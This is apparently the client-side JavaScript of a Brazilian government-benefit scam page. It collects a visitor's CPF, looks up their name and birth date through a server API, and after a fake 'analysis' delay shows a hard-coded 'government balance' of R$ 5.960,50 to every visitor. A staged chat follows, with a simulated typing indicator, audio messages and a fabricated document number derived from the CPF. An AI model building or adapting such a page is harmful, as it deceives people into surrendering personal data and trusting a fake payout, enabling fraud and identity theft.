const $ = (selector) => document.querySelector(selector);
let resultTimer = null;
let amountTimer = null;
let chatTimers = [];
let currentUserName = "cidadao";
let currentCpf = "";

function onlyDigits(value) {
  return String(value || "").replace(/\D/g, "");
}

function formatCpf(value) {
  return onlyDigits(value)
    .slice(0, 11)
    .replace(/(\d{3})(\d)/, "$1.$2")
    .replace(/(\d{3})(\d)/, "$1.$2")
    .replace(/(\d{3})(\d{1,2})$/, "$1-$2");
}

async function lookupCpf(cpf) {
  const response = await fetch("/api/consulta-cpf", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ cpf }),
  });
  const payload = await response.json();

  if (!response.ok || !payload.ok) {
    throw new Error(payload.error || "LOOKUP_FAILED");
  }

  return payload.result;
}

function showResult(lookupResult, fallbackCpf) {
  const verifiedName = lookupResult.name || "Nao Informado";
  const verifiedCpf = lookupResult.cpf || fallbackCpf;
  const verifiedBirthDate = lookupResult.birthDate || "Consultando";
  currentUserName = verifiedName;
  currentCpf = verifiedCpf;

  $("#verifiedName").textContent = verifiedName;
  $("#verifiedCpf").textContent = verifiedCpf;
  $("#verifiedBirthDate").textContent = verifiedBirthDate;
  $("#amountStatus").textContent = "Finalizando analise dos dados";
  $("#amountStatus").classList.remove("amount-value");
  $("#amountSpinner").classList.remove("hidden");
  $("#receiveButton").classList.add("hidden");
  $("#cpfScreen").classList.add("hidden");
  $("#transitionScreen").classList.add("hidden");
  $("#resultScreen").classList.remove("hidden");

  clearTimeout(resultTimer);
  clearTimeout(amountTimer);
  amountTimer = setTimeout(() => {
    $("#amountStatus").textContent = "Saldo disponibilizado pelo governo: R$ 5.960,50";
    $("#amountStatus").classList.add("amount-value");
    $("#amountSpinner").classList.add("hidden");
    $("#receiveButton").classList.remove("hidden");
  }, 2600);
}

function fillMiniDocument() {
  const cleanName = currentUserName && currentUserName !== "Nao Informado" ? currentUserName : "Maria Vital";
  $("#chatUserName").textContent = cleanName;
  $("#docName").textContent = cleanName;
  $("#docNumber").textContent = `${onlyDigits(currentCpf).slice(0, 2) || "03"}.40.37412.95828945-0`;
}

function startChatFlow() {
  chatTimers.forEach((timer) => clearTimeout(timer));
  chatTimers = [];
  fillMiniDocument();

  document.querySelectorAll(".audio-bubble audio").forEach((audio) => {
    audio.pause();
    audio.currentTime = 0;
  });
  document.querySelectorAll(".audio-play").forEach((button) => {
    button.textContent = "▶";
  });

  document.querySelectorAll(".chat-step").forEach((step) => {
    step.classList.remove("is-visible");
    step.classList.remove("is-playing");
  });

  let typingIndicator = document.querySelector(".typing-indicator");
  if (!typingIndicator) {
    typingIndicator = document.createElement("div");
    typingIndicator.className = "typing-indicator";
    typingIndicator.innerHTML = "<span></span><span></span><span></span>";
    $("#chatMessages").appendChild(typingIndicator);
  }
  typingIndicator.classList.remove("is-visible");

  const steps = Array.from(document.querySelectorAll(".chat-step"));
  let elapsed = 1400;

  steps.forEach((step, index) => {
    const readingPause = step.classList.contains("audio-bubble")
      ? 5000
      : step.classList.contains("mini-document")
        ? 5500
        : 3500;
    const typingDelay = step.classList.contains("mini-document") ? 2400 : 1800;
    const showAt = elapsed + typingDelay;

    chatTimers.push(setTimeout(() => {
      typingIndicator.classList.add("is-visible");
      typingIndicator.scrollIntoView({ behavior: "smooth", block: "end" });
    }, elapsed));

    chatTimers.push(setTimeout(() => {
      typingIndicator.classList.remove("is-visible");
      step.classList.add("is-visible");
      step.scrollIntoView({ behavior: "smooth", block: "end" });
    }, showAt));

    elapsed = showAt + readingPause;
  });
}

$("#enterButton").addEventListener("click", () => {
  $("#homeScreen").classList.add("hidden");
  $("#cpfScreen").classList.remove("hidden");
  $("#cpfInput").focus();
});

$("#cpfInput").addEventListener("input", (event) => {
  event.currentTarget.value = formatCpf(event.currentTarget.value);
  $("#formMessage").textContent = "";
});

$("#cpfForm").addEventListener("submit", async (event) => {
  event.preventDefault();
  const formattedCpf = $("#cpfInput").value;

  if (onlyDigits(formattedCpf).length !== 11) {
    $("#formMessage").textContent = "Digite um CPF valido.";
    $("#cpfInput").focus();
    return;
  }

  $("#formMessage").textContent = "Consultando dados...";
  const submitButton = event.currentTarget.querySelector("button[type='submit']");
  submitButton.disabled = true;
  submitButton.textContent = "Consultando...";
  submitButton.classList.add("is-loading");

  try {
    const lookupResult = await lookupCpf(formattedCpf);
    showResult(lookupResult, formattedCpf);
  } catch (error) {
    if (error.message === "API_TOKEN_MISSING") {
      $("#formMessage").textContent = "Configure o token da API no servidor.";
      return;
    }

    $("#formMessage").textContent = "Nao foi possivel consultar os dados.";
  } finally {
    submitButton.disabled = false;
    submitButton.textContent = "Continuar";
    submitButton.classList.remove("is-loading");
  }
});

$("#listenButton").addEventListener("click", async () => {
  const video = $("#resultVideo");
  video.muted = false;
  video.controls = true;

  try {
    await video.play();
    $("#listenButton").classList.add("hidden");
  } catch {
    $("#listenButton span:last-child").textContent = "Toque novamente para ouvir";
  }
});

document.querySelectorAll(".audio-play").forEach((button) => {
  button.addEventListener("click", async () => {
    const bubble = button.closest(".audio-bubble");
    const audio = bubble.querySelector("audio");

    document.querySelectorAll(".audio-bubble").forEach((otherBubble) => {
      if (otherBubble === bubble) {
        return;
      }
      const otherAudio = otherBubble.querySelector("audio");
      const otherButton = otherBubble.querySelector(".audio-play");
      otherAudio.pause();
      otherBubble.classList.remove("is-playing");
      otherButton.textContent = "▶";
    });

    if (audio.paused) {
      await audio.play();
      bubble.classList.add("is-playing");
      button.textContent = "❚❚";
    } else {
      audio.pause();
      bubble.classList.remove("is-playing");
      button.textContent = "▶";
    }
  });
});

document.querySelectorAll(".audio-bubble audio").forEach((audio) => {
  audio.addEventListener("ended", () => {
    const bubble = audio.closest(".audio-bubble");
    bubble.classList.remove("is-playing");
    bubble.querySelector(".audio-play").textContent = "▶";
  });
});

$("#receiveButton").addEventListener("click", () => {
  $("#resultScreen").classList.add("hidden");
  $("#chatScreen").classList.remove("hidden");
  startChatFlow();
});
